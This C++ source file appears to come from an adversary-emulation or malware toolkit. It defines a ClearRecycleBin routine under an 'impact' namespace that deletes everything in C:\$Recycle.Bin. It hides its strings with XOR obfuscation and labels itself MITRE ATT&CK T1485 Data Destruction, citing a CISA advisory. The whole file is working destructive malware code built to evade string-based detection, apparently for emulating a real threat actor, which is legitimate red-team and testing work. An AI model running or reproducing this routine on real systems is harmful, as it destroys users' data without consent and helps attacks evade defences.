#include "crypto/xor_obfuscation.hpp"
#include "impact.hpp"
#include "logger.hpp"
#include <format>

namespace impact {

/*
 * ClearRecycleBin:
 *      About:
 *          Empties recycle bin (C:\$Recycle.Bin) using the C++ filesystem std library.
 *      Result:
 *          Empty recycle bin (C:\$Recycle.Bin)
 *      MITRE ATT&CK Techniques:
 *          T1485: Data Destruction
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 */
bool ClearRecycleBin() {
    std::error_code error_code;
    std::uintmax_t num_removed = std::filesystem::remove_all(std::filesystem::path(XOR_LIT("C:\\$Recycle.Bin")), error_code);
    if (num_removed == static_cast<std::uintmax_t>(-1) || error_code.value() != 0) {
        XorLogger::LogError(std::format(
            "{}: {}. Error message: {}", 
            XOR_LIT("Failed to remove all files from Recycle Bin. Error code"),
            error_code.value(),
            error_code.message()
        ));
        return false;
    }
    XorLogger::LogDebug(std::format("{} {} {}", XOR_LIT("Successfully removed"), num_removed, XOR_LIT("files from Recycle Bin.")));
    return true;
}

} // namespace